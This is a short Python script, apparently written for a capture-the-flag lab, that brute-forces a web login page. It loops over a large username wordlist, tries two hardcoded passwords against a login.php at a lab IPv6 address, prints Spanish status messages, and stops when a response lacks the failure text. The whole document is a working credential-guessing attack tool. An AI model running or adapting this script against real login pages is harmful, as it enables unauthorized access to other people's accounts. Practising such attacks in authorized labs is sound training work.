#!/usr/bin/python3
from pwn import log
import requests

passwords = ["godofmischiefisloki", "trickeryanddeceit"]

bar = log.progress("")

with open("/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt") as file:
    for line in file:
        username = line.strip()
        for password in passwords:
             target = "http://[dead:beef::250:56ff:fe96:4e3f]/login.php"
             data = {"user": username, "password": password}
             bar.status(f"Probando credenciales: {username}:{password}")
             request = requests.post(target, data=data)

             if "Sorry, those credentials do not match" not in request.text:
                 bar.success(f"Credenciales válidas: {username}:{password}")
                 exit(0)
